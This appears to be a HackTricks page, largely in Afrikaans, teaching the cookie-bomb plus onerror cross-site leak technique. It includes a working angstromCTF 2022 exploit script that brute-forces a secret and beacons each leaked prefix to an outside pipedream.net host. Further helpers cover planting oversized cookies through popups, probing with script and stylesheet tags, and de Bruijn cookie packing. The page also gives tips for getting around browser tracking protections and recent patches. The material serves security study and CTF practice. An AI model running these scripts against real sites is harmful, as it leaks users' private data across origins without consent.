# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

Hierdie tegniek kombineer:
- Cookie bombing: die slagoffer se blaaier met baie/groot cookies vir die teiken-oorsprong volstop sodat opvolgende versoeke server-/versoeklimiete tref (request header size, URL size in redirects, ens.).
- Error-event oracle: probing a cross-origin endpoint with a `<script>` (or other subresource) and distinguishing states with `onload` vs `onerror`.

Hoëvlak-idee
- Vind 'n teiken-endpoint waarvan die gedrag verskil vir twee state wat jy wil toets (bv., soektog “hit” vs “miss”).
- Maak seker die “hit” pad sal 'n swaar redirect chain of lang URL veroorsaak terwyl die “miss” pad kort bly. Blaas request headers op deur baie cookies te stuur sodat slegs die “hit” pad die server laat misluk met 'n HTTP-fout (bv., 431/414/400). Die fout flip die onerror event en word 'n oracle vir XS-Search.

Wanneer werk dit
- Jy kan veroorsaak dat die slagoffer-blaaier cookies na die teiken stuur (bv., cookies is SameSite=None of jy kan dit in 'n first-party konteks stel via 'n popup `window.open`).
- Daar is 'n app-funksie wat jy kan misbruik om arbitrêre cookies te stel (bv., “save preference” endpoints wat beheerbare invoername/waardes in Set-Cookie omskakel) of om post-auth redirects te maak wat aanvaller-beheerde data in die URL inkorporeer.
- Die server reageer anders op die twee state en, met opgeblase headers/URL, oorskry een toestand 'n limiet en stuur 'n foutrespons terug wat onerror trigger.

Nota oor serverfoute wat as die oracle gebruik word
- 431 Request Header Fields Too Large word gewoonlik teruggegee wanneer cookies versoekheaders opblaas; 414 URI Too Long of 'n server-spesifieke 400 kan teruggegee word vir lang versoekdoeleindes. Enigeen hiervan lei tot 'n mislukte subresource-laai en aktiveer onerror. Sien [MDN’s 431 entry](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431) vir tipiese oorsake soos oortollige cookies.

<details>
<summary>Practical example (angstromCTF 2022)</summary>

Die volgende script (uit 'n openbare writeup) misbruik 'n funksie wat die aanvaller toelaat om arbitrêre cookies in te voeg, en laai dan 'n cross-origin search endpoint as 'n script. Wanneer die query korrek is, voer die server 'n redirect uit wat, saam met die cookie bloat, die serverlimiete oorskry en 'n foutstatus teruggee, sodat script.onerror afvuur; anders gebeur niks.
</details>
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
</details>

Waarom die popup (`window.open`)?
- Moderne blaaiers blokkeer toenemend third-party cookies. Deur 'n top-level venster na die teiken te open, maak dit cookies first‑party sodat Set-Cookie responses van die teiken sal bly staan, wat die cookie-bomb-stap moontlik maak selfs met third‑party cookie-beperkings.

2024–2025 notas oor cookie-beskikbaarheid
- Chrome’s Tracking Protection-rollout (January 2024) blokkeer reeds third-party cookies vir 'n ewekansige kohort en is beplan om na die hele gebruikersbasis uit te brei sodra die UK CMA dit goedkeur, dus gaan daarvan uit dat enige slagoffer skielik 3P cookies kan verloor. Automatiseer die fallback: detecteer wanneer jou script probe misluk sonder ooit die teiken te bereik en skuif deursigtig na die popup/first-party flow. Safari en Firefox blokkkeer reeds die meeste third-party cookies per verstek en CHIPS/partitioned cookies beteken elke top-level site het nou sy eie jar.
- Gebruik 'n first‑party cookie planting flow (`window.open` + auto-submit na 'n cookie-setting endpoint) en probeer dan met 'n subresource wat slegs sukses het wanneer daardie cookies gestuur word. As third‑party cookies geblokkeer is, skuif die probe na 'n same-site konteks (bv. hardloop die oracle in die popup via 'n same-site gadget en exfiltrate die boolean met `postMessage` of 'n beacon na jou server), of skryf die victim origin in by Chrome’s deprecation trial as jy dit regmatig beheer.

<details>
<summary>Tracking-Protection-safe first-party planting helper</summary>

Wanneer jy tientalle cookies moet inprop vanuit 'n cross-site konteks, stel 'n tydelike top-level venster op en stuur 'n reeks oorgrootte form submissions na die kwetsbare Set-Cookie endpoint:
```js
async function plantFirstPartyCookies(endpoint, fields) {
for (let i = 0; i < 5; i++) {
const name = crypto.randomUUID();
const form = Object.assign(document.createElement('form'), {action:endpoint, method:'POST', target:name});
Object.entries(fields).forEach(([k, v]) => {
const input = document.createElement('input');
input.name = k;
input.value = v + '_'.repeat(400 + 120 * i);
form.appendChild(input);
});
document.body.appendChild(form);
window.open('about:blank', name, 'noopener');
form.submit();
await new Promise(r => setTimeout(r, 120));
form.remove();
}
}
```
Roep dit net voordat jy begin probeer, sodat elke oracle run met 'n vars gevulde cookie jar begin.

</details>

Generiese probe-hulpmiddel
As jy reeds 'n manier het om baie cookies op die target origin (first-party) te stel, kan jy hierdie minimale oracle hergebruik teen enige endpoint waarvan sukses/mislukking tot verskillende netwerkuitkomste (status/MIME/redirect) lei:
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
Alternatiewe tag oracle (stylesheet)
```js
function probeCSS(url) {
return new Promise((resolve) => {
const l = document.createElement('link');
l.rel = 'stylesheet';
l.href = url;
l.onload = () => resolve(false);
l.onerror = () => resolve(true);
document.head.appendChild(l);
});
}
```
Gevorderd: de Bruijn–based cookie packing (CTF-proven)
- Wanneer die app jou toelaat om groot cookie values te beheer, kan jy guesses doeltreffend inpakk deur 'n de Bruijn sequence aan elke probe aan te heg. Dit hou die per‑probe overhead klein en verseker dat die heavy branch konsekwent swaarder is slegs vir die regte prefix. Voorbeeldgenerator vir |Σ| symbols van lengte n (pas in 'n cookie value):
```js
const ALPH = '_{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
function deBruijn(k, n, alphabet=ALPH){
const a = Array(k * n).fill(0), seq=[];
(function db(t,p){
if(t>n){ if(n%p===0) for(let j=1;j<=p;j++) seq.push(a[j]); }
else { a[t]=a[t-p]; db(t+1,p); for(let j=a[t-p]+1;j<k;j++){ a[t]=j; db(t+1,t);} }
})(1,1);
return seq.map(i=>alphabet[i]).join('');
}
```
- Idee in die praktyk: stel meerdere cookies in waarvan die waardes prefix + deBruijn(k,n) is. Slegs wanneer die getoetste prefix korrek is, neem die bediener die swaarder pad (bv. ekstra redirect wat die lang cookie of URL reflekteer), wat, gekombineer met die cookie bloat, perke oorskry en onerror omskakel. Sien 'n LA CTF 2024 openbare solver wat hierdie benadering gebruik.

Wenke om die orakel te bou
- Dwing die “positiewe” staat swaarder: ketting 'n ekstra redirect slegs wanneer die voorwaarde waar is, of laat die redirect URL ongebreidelde gebruiker-invoer reflekteer sodat dit saam met die geskatte prefix groei.
- Inflate headers: herhaal cookie bombing totdat 'n konsekwente fout op die “heavy” pad waargeneem word. Bedieners beperk gewoonlik header-grootte en sal vroeër misluk wanneer baie cookies teenwoordig is.
- Stabiliseer: stuur verskeie parallelle cookie set operations en probeer herhaaldelik om tyd- en caching-ruis uit te middel.
- Bust caches and avoid pooling artifacts: voeg 'n ewekansige `#fragment` of `?r=` by na probe URLs, en verkies onderskeibare venstername wanneer `window.open` lusse gebruik word.
- Alternate subresources: as `<script>` gefilter is, probeer `<link rel=stylesheet>` of `<img>`. Die onload/onerror boolean is die orakel; inhoud hoef nooit gepars te word nie.

Algemene header/URL perke (nutige drempels)
- Reverse proxies/CDNs en bedieners handhaaf verskillende perke. Vanaf Oktober 2025 dokumenteer Cloudflare 128 KB totaal vir request headers (en 16 KB URL) op die edge, dus mag jy meer/groter cookies nodig hê wanneer teikens agter dit sit. Ander stacks (bv. Apache via LimitRequestFieldSize) is dikwels nader aan ~8 KB per header-reël en sal vinniger foute bereik. Pas die bomb-grootte ooreenkomstig aan (sien [Cloudflare’s documented limit](https://developers.cloudflare.com/fundamentals/reference/connection-limits/)).

Browser hardening watchlist (2025+)
- Firefox 139/ESR 128.11 (Mei 2025) het skrip-tag laai/fout rekeningkunde aangeskerp vir cross-origin hulpbronne (CVE-2025-5266). Op gepatchte kliënte word die `onerror` sein vir sekere omgelei antwoorde gedemp, dus diversifiseer die orakel (parallelle `<link rel=stylesheet>`, `<img>`, of `fetch` met onversoende MIME) en fingerprint die slagoffer se UA voordat jy aanvaar die boolean nogsteeds vuurt.
- Verwacht enterprise Chromium builds met Tracking Protection of Fetch Metadata beleid om af en toe cookies te verwyder of redirects te herskryf. Ontdek hierdie gevalle deur eers 'n kort endpoint te probeer; wanneer dit misluk, skakel outomaties oor na die uitvoering van die hele aanval binne die popup en oordra stukkies via `postMessage`/`BroadcastChannel`.

Verwante XS-Search truuks
- URL-lengte-gebaseerde orakels (geen cookies nodig nie) kan gekombineer of in plaas daarvan gebruik word wanneer jy 'n baie lang request-doel kan afdwing:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Aantekeninge
- Hierdie klas aanvalle word breedweg bespreek as “Error Events” XS-Leaks. Die cookie-bomb stap is net 'n gerieflike manier om slegs een tak oor die bedienerperke te dwing, wat 'n betroubare boolean-orakel produseer.



## Verwysings
- XS-Leaks: Error Events (onerror/onload as an oracle): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (common with many cookies): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
- LA CTF 2024 writeup note showing a de Bruijn cookie-bomb oracle: https://gist.github.com/arkark/5787676037003362131f30ca7c753627
- Cloudflare edge limits (URLs 16 KB, request headers 128 KB): https://developers.cloudflare.com/fundamentals/reference/connection-limits/
- Chrome Tracking Protection rollout details: https://blog.google/products/chrome/privacy-sandbox-tracking-protection/
- Mozilla MFSA 2025-44 (CVE-2025-5266) tightening script tag onerror behavior: https://www.mozilla.org/en-US/security/advisories/mfsa2025-44/
{{#include ../../banners/hacktricks-training.md}}
